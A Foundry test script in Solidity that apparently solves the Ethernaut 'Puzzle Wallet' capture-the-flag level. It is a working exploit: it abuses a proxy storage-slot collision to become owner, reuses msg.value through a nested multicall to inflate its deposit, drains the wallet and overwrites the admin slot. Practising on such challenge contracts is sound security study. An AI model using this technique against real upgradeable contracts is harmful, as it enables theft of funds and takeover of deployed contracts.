// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../instances/Ilevel24.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        PuzzleWallet impl = new PuzzleWallet{value: 0.001 ether}();
        impl.init(type(uint256).max);
        bytes memory init;
        PuzzleProxy proxy = new PuzzleProxy(msg.sender, address(impl), init);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(impl.deposit.selector);

        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(impl.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(
            impl.multicall.selector,
            depositSelector
        );

        // become the owner of PuzzleWallet contract
        proxy.proposeNewAdmin(msg.sender);
        impl.addToWhitelist(msg.sender);
        impl.multicall{value: 0.001 ether}(nestedMulticall);
        impl.execute(msg.sender, 0.002 ether, "");
        impl.setMaxBalance(uint256(uint160(msg.sender)));
        console.log("New Admin is : ", proxy.admin());
        vm.stopBroadcast();
    }
}
